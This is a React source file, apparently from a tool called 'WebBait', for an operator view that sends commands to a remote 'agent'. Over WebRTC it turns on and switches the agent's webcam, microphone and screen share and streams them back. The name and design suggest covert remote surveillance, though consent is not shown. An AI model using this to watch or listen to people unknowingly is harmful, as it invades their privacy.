import {
  Box,
  Button,
  ButtonGroup,
  FormControl,
  Grid,
  InputLabel,
  LinearProgress,
  MenuItem,
  Paper,
  Select,
  Stack,
  Tooltip,
  Typography,
  useTheme,
} from '@mui/material';
import _ from 'lodash';
import React, { useCallback, useEffect, useRef, useState } from 'react';
import { useTranslation } from 'react-i18next';
import { useDispatch, useSelector } from 'react-redux';
import {
  ArrowBack as ArrowBackIcon,
} from '@mui/icons-material';
import { useLocation, useNavigate, useParams } from 'react-router-dom';
import { useTitle } from 'react-use';
import { AgentCommandResults, AgentCommands, Agents } from '../models';
import { FETCH_AGENTS_ACTION, FETCH_AGENT_COMMANDS_ACTION, RootState, UPDATE_AGENT, UPDATE_AGENT_COMMAND } from '../redux';
import { connectAdminWebsocket, MediasoupPeerProps, MediasoupProducerType, WebRtcSubjects, WebRtcWebsocket, websocketManager, websocketService } from '../services';
import { AgentCmdReceived, AgentConnection } from './agent.view';
import { Device } from 'mediasoup-client';
import { Subject } from 'rxjs';
import Hark from 'hark';
import { useWindowSize } from "react-use";
import { useSnackbar } from 'notistack';
import { LoadingButton } from '@mui/lab';

export const AgentWebRtcView = () => {
  const { enqueueSnackbar } = useSnackbar();
  const location = useLocation();
  let stateToken = ''
  const locationState = location.state as { token?: string } | null;
  stateToken = locationState && locationState.token ? locationState.token : '';
  const theme = useTheme();
  const { t } = useTranslation();
  const { width, height } = useWindowSize();
  const { agentId } = useParams<{ agentId: string }>();
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const [agent, agents, fetching, cmds] = useSelector<RootState, [Agents | undefined, Agents[], boolean, AgentCommands[]]>(state => {
    const foundAgent = _.find(state.agents, { agentId });
    const foundCmds = foundAgent ? state.agent_commands.filter(cmd => cmd.agentId === foundAgent.id) : [];
    return [foundAgent, state.agents, state.app.fetching, foundCmds];
  }, _.isEqual);
  useEffect(() => {
    dispatch(FETCH_AGENTS_ACTION());
    connectAdminWebsocket();
    handleJoinLeaveWebRtcSession();
    return () => {
      if (webRtcConnected) {
        websocketService && websocketService.close();
        handleJoinLeaveWebRtcSession();
      }
    }
  }, []);
  useEffect(() => {
    agent && dispatch(FETCH_AGENT_COMMANDS_ACTION({ include: ['result'] }, { id: agent.id }));
  }, [agent]);
  const [device] = useState(new Device());
  const [subject] = useState(new Subject<WebRtcSubjects>());
  const [webRtcWebsocket, setWebRtcWebsocket] = useState<WebRtcWebsocket | undefined>(undefined);
  const [webRtcConnected, setWebRtcConnected] = useState(false);
  const [peerDevices, setPeerDevices] = useState<MediaDeviceInfo[]>([]);
  const [peerSelectedVideoDevice, setPeerSelectedVideoDevice] = useState<MediaDeviceInfo | undefined>(undefined);
  const [peerActiveVideoDevice, setPeerActiveVideoDevice] = useState<MediaDeviceInfo | undefined>(undefined);
  const [peerSelectedAudioDevice, setPeerSelectedAudioDevice] = useState<MediaDeviceInfo | undefined>(undefined);
  const [peerActiveAudioDevice, setPeerActiveAudioDevice] = useState<MediaDeviceInfo | undefined>(undefined);
  const [peerConnected, setPeerConnected] = useState(false);
  const [peerProps, setPeerProps] = useState<MediasoupPeerProps>({ mic: false, webcam: false, screen: false });
  const [peerMicVolume, setPeerMicVolume] = useState(0);
  const audioObjectRef = useRef<HTMLAudioElement>(null);
  const webcamObjectRef = useRef<HTMLVideoElement>(null);
  const screenObjectRef = useRef<HTMLVideoElement>(null);
  const [startingStoppingScreenShare, setStartingStoppingScreenShare] = useState(false);
  useEffect(() => {
    const subscription = subject.subscribe({
      next: subject => {
        if (!webRtcWebsocket) return;
        if (!agent) return;
        switch (subject.type) {
          case 'peerDevices':
            if (subject.id !== agent.agentId) return;
            setPeerDevices(subject.devices.filter(device => device.deviceId !== ''));
            break;
          case 'peerJoined':
            if (subject.id !== agent.agentId) return;
            setPeerConnected(true);
            setPeerProps(subject.props);
            break;
          case 'peerLeft':
            if (subject.id !== agent.agentId) return;
            setPeerConnected(false);
            setPeerProps({ mic: false, webcam: false, screen: false });
            setPeerActiveAudioDevice(undefined);
            setPeerActiveVideoDevice(undefined);
            break;
          case 'peerUpdated':
            if (subject.id !== agent.agentId) return;
            setPeerProps(subject.props);
            setPeerConnected(true);
            break;
          case 'connected':
            setWebRtcConnected(true);
            break;
          case 'disconnected':
            setWebRtcConnected(false);
            break;
          case 'transportCreated':
            if (subject.transportType === 'RECEIVE') setReadyToConsume(true);
            break;
          case 'webRtcError':
            if (subject.id !== agentId) return;
            enqueueSnackbar(subject.msg, { variant: 'error' });
            break;
        }
      }
    });
    return () => {
      subscription.unsubscribe();
    }
  }, [webRtcWebsocket, webRtcConnected, agent, subject, enqueueSnackbar, setStartingStoppingScreenShare]);
  const [readyToConsume, setReadyToConsume] = useState(false);
  useEffect(() => {
    if (webRtcWebsocket && agent && readyToConsume) {
      if (audioObjectRef.current) {
        if (peerProps.mic) {
          webRtcWebsocket.consume(agent.agentId, 'mic', consumer => {
            if (audioObjectRef.current) {
              const stream = new MediaStream([consumer.track]);
              audioObjectRef.current.srcObject = stream;
              audioObjectRef.current.play().catch(console.error);
              audioObjectRef.current.volume = 1;
              const hark = Hark(stream);
              hark.on('stopped_speaking', () => {
                setPeerMicVolume(0);
              });
              hark.on('volume_change', (dBs) => {
                let audioVolume = Math.round(Math.pow(10, dBs / 85) * 10);
                if (audioVolume === 1) audioVolume = 0;
                if (audioVolume !== peerMicVolume) setPeerMicVolume(audioVolume);
              });
              consumer.on('producerclose', () => {
                if (audioObjectRef.current) {
                  audioObjectRef.current.srcObject = null;
                  setPeerMicVolume(0);
                  hark.stop();
                }
              });
              consumer.on('transportclose', () => {
                if (audioObjectRef.current) audioObjectRef.current.srcObject = null;
                setPeerMicVolume(0);
                hark.stop();
              });
            }
          });
        } else {
          webRtcWebsocket.stopConsuming(agent.agentId, 'mic');
        }
      }
      if (webcamObjectRef.current) {
        if (peerProps.webcam) {
          webRtcWebsocket.consume(agent.agentId, 'webcam', consumer => {
            if (webcamObjectRef.current) webcamObjectRef.current.srcObject = new MediaStream([consumer.track]);
            if (webcamPreviewObjectRef.current) webcamPreviewObjectRef.current.srcObject = new MediaStream([consumer.track]);
          });
        } else {
          webRtcWebsocket.stopConsuming(agent.agentId, 'webcam');
          if (webcamObjectRef.current) webcamObjectRef.current.srcObject = null;
          if (webcamPreviewObjectRef.current) webcamPreviewObjectRef.current.srcObject = null;
        }
      }
      if (screenObjectRef.current) {
        if (peerProps.screen) {
          webRtcWebsocket.consume(agent.agentId, 'screen', consumer => {
            if (screenObjectRef.current) screenObjectRef.current.srcObject = new MediaStream([consumer.track]);
            if (screenPreviewObjectRef.current) screenPreviewObjectRef.current.srcObject = new MediaStream([consumer.track]);
          });
        } else {
          webRtcWebsocket.stopConsuming(agent.agentId, 'screen');
          if (screenObjectRef.current) screenObjectRef.current.srcObject = null;
          if (screenPreviewObjectRef.current) screenPreviewObjectRef.current.srcObject = null;
        }
      }
    }
  }, [peerProps, webRtcWebsocket, agent, readyToConsume]);
  useEffect(() => {
    if (websocketService) {
      websocketService.on('agent connection', (agentConnection: AgentConnection) => {
        const foundAgent = _.find(agents, { agentId: agentConnection.agentId });
        if (foundAgent) dispatch(UPDATE_AGENT({ ...foundAgent, connected: agentConnection.connected }));
      });
      websocketService.on('cmd received', (cmdReceived: AgentCmdReceived) => {
        const cmd = _.find(cmds, { cmdId: cmdReceived.cmdId });
        if (cmd) {
          dispatch(UPDATE_AGENT_COMMAND({ ...cmd, received: true, receivedAt: cmdReceived.receivedAt }));
        }
      });
      websocketService.on('result', (result: AgentCommandResults) => {
        const cmd = _.find(cmds, { id: result.cmdId });
        if (cmd) {
          dispatch(UPDATE_AGENT_COMMAND({ ...cmd, received: true, receivedAt: cmd.receivedAt ? cmd.receivedAt : result.executedAt, result }));
        }
      });
    }
    return () => {
      websocketService && websocketService.off('agent connection');
      websocketService && websocketService.off('cmd received');
      websocketService && websocketService.off('result');
    }
  }, [webRtcConnected, device, subject, websocketService]);
  useEffect(() => {
    if (websocketService) {
      websocketService.on('webrtc-token', async (token: string) => {
        if (webRtcWebsocket) {
          if (webRtcConnected) return;
          webRtcWebsocket.socket.auth = { token };
          await webRtcWebsocket.connect();
          setWebRtcConnected(true);
          return;
        }
        const socket = websocketManager.socket('/webrtc', {
          auth: {
            token,
          }
        });
        setWebRtcWebsocket(new WebRtcWebsocket(socket, device, subject));
      });
    }
    return () => {
      websocketService && websocketService.off('webrtc-token');
    }
  }, [webRtcConnected, device, subject, websocketService]);
  useTitle(`WebBait - ${t('titles.agent')} ${agent && agent.id} - WebRTC`);
  const handleCommandWebRtcSession = () => {
    if (websocketService) {
      websocketService.emit('cmd', {
        cmd: 'init-webrtc-device',
        agentId,
      });
      agent && dispatch(FETCH_AGENT_COMMANDS_ACTION({ include: ['result'] }, { id: agent.id }));
    }
  }
  const handleJoinLeaveWebRtcSession = () => {
    if (websocketService) {
      if (!webRtcConnected) {
        if (!stateToken) websocketService.emit('RequestWebRtcSessionToken', agentId);
        else {
          const socket = websocketManager.socket('/webrtc', {
            auth: {
              token: stateToken,
            }
          });
          setWebRtcWebsocket(new WebRtcWebsocket(socket, device, subject));
        }
      } else {
        webRtcWebsocket && webRtcWebsocket.close();
        setWebRtcWebsocket(undefined);
        setWebRtcConnected(false);
        setPeerConnected(false);
      }
    }
  }
  const handleRequestPeerDevices = () => {
    if (webRtcWebsocket && agent) {
      webRtcWebsocket.socket.emit('requestPeerDevices', agent.agentId);
    }
  }
  const [enablingDisablingMic, setEnablingDisablingMic] = useState(false);
  const handleEnableDisableMic = () => {
    if (webRtcWebsocket && agent && !enablingDisablingMic) {
      setEnablingDisablingMic(true);
      if (!peerActiveAudioDevice && !peerProps.mic) {
        if (!peerSelectedAudioDevice) return;
        webRtcWebsocket.socket.timeout(5000).emit('enableMic', agent.agentId, peerSelectedAudioDevice.deviceId, (err: any, error?: string) => {
          if (err || error) enqueueSnackbar(`Enable Mic: ${err || error}`, { variant: 'error' });
          setEnablingDisablingMic(false);
          setPeerActiveAudioDevice(peerSelectedAudioDevice);
        });
      } else {
        webRtcWebsocket.socket.timeout(5000).emit('disableMic', agent.agentId, (err: any, error?: string) => {
          if (err || error) enqueueSnackbar(`Disable Mic: ${err || error}`, { variant: 'error' });
          setEnablingDisablingMic(false);
          setPeerActiveAudioDevice(undefined);
        });
      }
    }
  }
  const [enablingDisablingWebcam, setEnablingDisablingWebcam] = useState(false);
  const handleEnableDisableWebcam = () => {
    if (webRtcWebsocket && agent && !enablingDisablingWebcam) {
      setEnablingDisablingWebcam(true);
      if (!peerActiveVideoDevice && !peerProps.webcam) {
        if (!peerSelectedVideoDevice) return;
        webRtcWebsocket.socket.timeout(5000).emit('enableWebcam', agent.agentId, peerSelectedVideoDevice.deviceId, (err: any, error?: string) => {
          if (err || error) enqueueSnackbar(`Enable Webcam: ${err || error}`, { variant: 'error' });
          setEnablingDisablingWebcam(false);
          setPeerActiveVideoDevice(peerSelectedVideoDevice);
        });
      } else {
        webRtcWebsocket.socket.timeout(5000).emit('disableWebcam', agent.agentId, (err: any, error?: string) => {
          if (err || error) enqueueSnackbar(`Disable Webcam: ${err || error}`, { variant: 'error' });
          setEnablingDisablingWebcam(false);
          setPeerActiveVideoDevice(undefined);
        });
      }
    }
  }
  const handleStartStopScreenShare = useCallback(() => {
    if (webRtcWebsocket && agent && !startingStoppingScreenShare) {
      setStartingStoppingScreenShare(true);
      if (!peerProps.screen) {
        webRtcWebsocket.socket.timeout(5000).emit('startScreenShare', agent.agentId, (err: any, error?: string) => {
          if (err || error) enqueueSnackbar(`Start Screen Share: ${err || error}`, { variant: 'error' });
          setStartingStoppingScreenShare(false);
        });
      } else {
        webRtcWebsocket.socket.timeout(5000).emit('stopScreenShare', agent.agentId, (err: any, error?: string) => {
          if (err || error) enqueueSnackbar(`Stop Screen Share: ${err || error}`, { variant: 'error' });
          setStartingStoppingScreenShare(false);
        });
      }
    }
  }, [setStartingStoppingScreenShare, startingStoppingScreenShare, webRtcWebsocket, agent, peerProps]);
  const screenPreviewObjectRef = useRef<HTMLVideoElement>(null);
  const webcamPreviewObjectRef = useRef<HTMLVideoElement>(null);
  const [selectedPreview, setSelectedPreview] = useState<MediasoupProducerType | ''>('');
  const handleThumbnailClick = (type: MediasoupProducerType) => () => setSelectedPreview(type !== selectedPreview ? type : '');
  useEffect(() => {
    switch (selectedPreview) {
      case 'webcam':
        if (webcamPreviewObjectRef.current && webcamObjectRef.current) {
          webcamPreviewObjectRef.current.srcObject = webcamObjectRef.current.srcObject;
          webcamPreviewObjectRef.current.play();
        }
        break;
      case 'screen':
        if (screenPreviewObjectRef.current && screenObjectRef.current) {
          screenPreviewObjectRef.current.srcObject = screenObjectRef.current.srcObject;
          screenPreviewObjectRef.current.play();
        }
        break;
    }
  }, [selectedPreview]);
  const [changingMic, setChangingMic] = useState(false);
  const handleChangeMic = () => {
    if (webRtcWebsocket && peerSelectedAudioDevice && !changingMic) {
      setChangingMic(true);
      webRtcWebsocket.socket.timeout(5000).emit('changeMic', agentId, peerSelectedAudioDevice.deviceId, (err: any, error?: string) => {
        setChangingMic(false);
        if (err || error) enqueueSnackbar(`Change Microphone: ${err || error}`, { variant: 'error' });
        else setPeerActiveAudioDevice(peerSelectedAudioDevice);
      });
    }
  }
  const [changingWebcam, setChangingWebcam] = useState(false);
  const handleChangeWebcam = () => {
    if (webRtcWebsocket && peerSelectedVideoDevice && !changingWebcam) {
      setChangingWebcam(true);
      webRtcWebsocket.socket.timeout(5000).emit('changeWebcam', agentId, peerSelectedVideoDevice.deviceId, (err: any, error?: string) => {
        setChangingWebcam(false);
        if (err || error) enqueueSnackbar(`Change Webcam: ${err || error}`, { variant: 'error' });
        else setPeerActiveVideoDevice(peerSelectedVideoDevice);
      });
    }
  }
  return (
    <Paper elevation={3} sx={{ p: 2, m: 2, height: '90vh' }}>
      <Grid container spacing={2} direction='column' sx={{ height: '100%' }}>
        {!!!agent && !fetching && t('messages.agents.errors.no_such_agent')}
        {agent && <>
          <Grid item sx={{ zIndex: 99 }}>
            <Stack spacing={2} direction='row' justifyContent='space-between'>
              <Button color='inherit' startIcon={<ArrowBackIcon />} onClick={() => navigate(`/agents/${agent.agentId}`)}>{t('titles.back')}</Button>
              <Typography>
                {t('titles.agent_status')}: <Typography component='b' color={agent.connected ? theme.palette.success.main : theme.palette.grey[500]}>
                  {agent.connected ? t('titles.connected') : t('titles.disconnected')}
                </Typography>
              </Typography>
              <Typography>
                {t('titles.peer_webrtc_status')}: <Typography component='b' color={peerConnected ? theme.palette.success.main : theme.palette.grey[500]}>
                  {peerConnected ? t('titles.connected') : t('titles.disconnected')}
                </Typography>
              </Typography>
              <ButtonGroup>
                <Button color='primary' variant='contained' disabled={!webRtcConnected && !peerConnected} onClick={handleRequestPeerDevices}>{t('titles.request_peer_devices')}</Button>
                <Button color='primary' variant='contained' onClick={handleJoinLeaveWebRtcSession}>{webRtcConnected ? t('titles.leave_webrtc_session') : t('titles.join_webrtc_session')}</Button>
                <Button color='primary' variant='contained' onClick={handleCommandWebRtcSession}>{t('titles.command_webrtc_session')}</Button>
              </ButtonGroup>
            </Stack>
          </Grid>
          <Grid container spacing={2} item sx={{ flexGrow: 1 }}>
            <Grid item xs={12} container spacing={2} sx={{ height: '20%' }}>
              <Grid item xs={6}>
                <Stack alignItems='stretch' width='100%' justifyContent='space-evenly' spacing={2}>
                  <FormControl fullWidth>
                    <InputLabel shrink id='peerDevices'>{t('titles.peer_devices')} (Webcam)</InputLabel>
                    <Select
                      labelId='peerDevices'
                      label={t('titles.peer_devices') + '(Webcam)'}
                      displayEmpty={true}
                      notched={true}
                      placeholder={peerDevices.length === 0 ? t('titles.no_peer_devices') : t('titles.select_peer_device')}
                      value={peerSelectedVideoDevice && peerSelectedVideoDevice.deviceId || ''}
                      onChange={e => setPeerSelectedVideoDevice(peerDevices.find(d => d.deviceId === e.target.value))}>
                      <MenuItem value=''>{peerDevices.filter(d => d.kind === 'videoinput').length === 0 ? t('titles.no_peer_devices') : t('titles.select_peer_device')}</MenuItem>
                      {peerDevices.filter(d => d.kind === 'videoinput').map(d => <MenuItem key={d.deviceId} value={d.deviceId}>{d.label || 'Unknown device'}</MenuItem>)}
                    </Select>
                  </FormControl>
                  <Stack spacing={2} direction='row' justifyContent='space-between'>
                    <LoadingButton loading={enablingDisablingWebcam} fullWidth variant='contained' onClick={handleEnableDisableWebcam} disabled={!peerSelectedVideoDevice && !peerActiveVideoDevice && !peerProps.webcam}>{peerProps.webcam ? 'Disable' : 'Enable'} Webcam</LoadingButton>
                    <LoadingButton loading={changingWebcam} fullWidth variant='contained' disabled={
                      peerSelectedVideoDevice &&
                      peerActiveVideoDevice &&
                      peerSelectedVideoDevice.deviceId === peerActiveVideoDevice.deviceId ||
                      !peerSelectedVideoDevice ||
                      !peerActiveVideoDevice
                    } onClick={handleChangeWebcam}>Change Webcam</LoadingButton>
                  </Stack>
                </Stack>
              </Grid>
              <Grid item xs={6}>
                <Stack alignItems='stretch' width='100%' justifyContent='space-evenly' spacing={2}>
                  <FormControl fullWidth>
                    <InputLabel shrink id='peerDevices'>{t('titles.peer_devices')} (Microphone)</InputLabel>
                    <Select
                      labelId='peerDevices'
                      label={t('titles.peer_devices') + '(Microphone)'}
                      displayEmpty={true}
                      notched={true}
                      placeholder={peerDevices.length === 0 ? t('titles.no_peer_devices') : t('titles.select_peer_device')}
                      value={peerSelectedAudioDevice && peerSelectedAudioDevice.deviceId || ''}
                      onChange={e => setPeerSelectedAudioDevice(peerDevices.find(d => d.deviceId === e.target.value))}>
                      <MenuItem value=''>{peerDevices.filter(d => d.kind === 'audioinput').length === 0 ? t('titles.no_peer_devices') : t('titles.select_peer_device')}</MenuItem>
                      {peerDevices.filter(d => d.kind === 'audioinput').map(d => <MenuItem key={d.deviceId} value={d.deviceId}>{d.label || 'Unknown device'}</MenuItem>)}
                    </Select>
                  </FormControl>
                  <Stack spacing={2} direction='row' justifyContent='space-between'>
                    <LoadingButton loading={enablingDisablingMic} fullWidth variant='contained' disabled={!peerSelectedAudioDevice && !peerActiveAudioDevice && !peerProps.mic} onClick={handleEnableDisableMic}>{peerProps.mic ? 'Disable' : 'Enable'} Microphone</LoadingButton>
                    <LoadingButton loading={changingMic} fullWidth variant='contained' disabled={
                      peerSelectedAudioDevice &&
                      peerActiveAudioDevice &&
                      peerSelectedAudioDevice.deviceId === peerActiveAudioDevice.deviceId ||
                      !peerSelectedAudioDevice ||
                      !peerActiveAudioDevice
                    } onClick={handleChangeMic}>Change Microphone</LoadingButton>
                    <LoadingButton fullWidth variant='contained' disabled={!peerConnected} onClick={handleStartStopScreenShare} loading={startingStoppingScreenShare}>{peerProps.screen ? 'Stop' : 'Start'} Screen Share</LoadingButton>
                  </Stack>
                </Stack>
              </Grid>
            </Grid>
            <Grid item xs={12} sx={{ height: '80%' }} spacing={2} container>
              <Grid item xs={10}>
                <Paper elevation={1} sx={{
                  height: height - Number(theme.spacing(35).replace('px', '')) - (theme.mixins.toolbar.minHeight ? Number(theme.mixins.toolbar.minHeight.toString().replace('px', '')) : 54),
                  width: width - Number(theme.spacing(10).replace('px', '')) - 300,
                }}>
                  {selectedPreview === 'screen' && <video height='100%' width='100%' ref={screenPreviewObjectRef} autoPlay playsInline controls={false}></video>}
                  {selectedPreview === 'webcam' && <video height='100%' width='100%' ref={webcamPreviewObjectRef} autoPlay playsInline controls={false}></video>}
                  {selectedPreview === 'mic' && <Box sx={{
                    height: '100%',
                    width: '100%',
                    position: 'relative',
                    '& > *': {
                      position: 'absolute !important',
                      top: 0,
                      left: 0,
                      right: 0,
                      bottom: 0,
                      margin: 'auto',
                      width: '90%',
                    }
                  }}><LinearProgress variant="determinate" value={peerMicVolume * 10} /></Box>}
                </Paper>
              </Grid>
              <Grid item xs={2}>
                <Stack spacing={2} direction='column' justifyContent='space-between' height='100%'>
                  <Tooltip title='Screen'>
                    <Paper onClick={handleThumbnailClick('screen')} data-selected={selectedPreview === 'screen'} elevation={1} sx={{
                      height: 175,
                      with: 300,
                      '&:hover': {
                        cursor: 'pointer',
                        border: '2px solid #ccc',
                      },
                      '&[data-selected="true"]': {
                        cursor: 'pointer',
                        border: `2px solid ${theme.palette.primary.main}`,
                      },
                    }}>
                      <video ref={screenObjectRef} height='100%' width='100%' autoPlay playsInline controls={false}></video>
                    </Paper>
                  </Tooltip>
                  <Tooltip title='Microphone'>
                    <Paper onClick={handleThumbnailClick('mic')} data-selected={selectedPreview === 'mic'} elevation={1} sx={{
                      height: 175,
                      with: 300,
                      '&:hover': {
                        cursor: 'pointer',
                        border: '2px solid #ccc',
                      },
                      '&[data-selected="true"]': {
                        cursor: 'pointer',
                        border: `2px solid ${theme.palette.primary.main}`,
                      },
                    }}>
                      <Box sx={{
                        height: '100%',
                        width: '100%',
                        position: 'relative',
                        '& > *': {
                          position: 'absolute !important',
                          top: 0,
                          left: 0,
                          right: 0,
                          bottom: 0,
                          margin: 'auto',
                          width: '90%',
                        }
                      }}><LinearProgress variant="determinate" value={peerMicVolume * 10} /></Box>
                      <audio ref={audioObjectRef} hidden autoPlay playsInline controls={false}></audio>
                    </Paper>
                  </Tooltip>
                  <Tooltip title='Webcam'>
                    <Paper onClick={handleThumbnailClick('webcam')} data-selected={selectedPreview === 'webcam'} elevation={1} sx={{
                      height: 175,
                      with: 300,
                      '&:hover': {
                        cursor: 'pointer',
                        border: '2px solid #ccc',
                      },
                      '&[data-selected="true"]': {
                        cursor: 'pointer',
                        border: `2px solid ${theme.palette.primary.main}`,
                      },
                    }}>
                      <video ref={webcamObjectRef} height='100%' width='100%' autoPlay playsInline controls={false}></video>
                    </Paper>
                  </Tooltip>
                </Stack>
              </Grid>
            </Grid>
          </Grid>
        </>}
      </Grid>
    </Paper >
  );
}
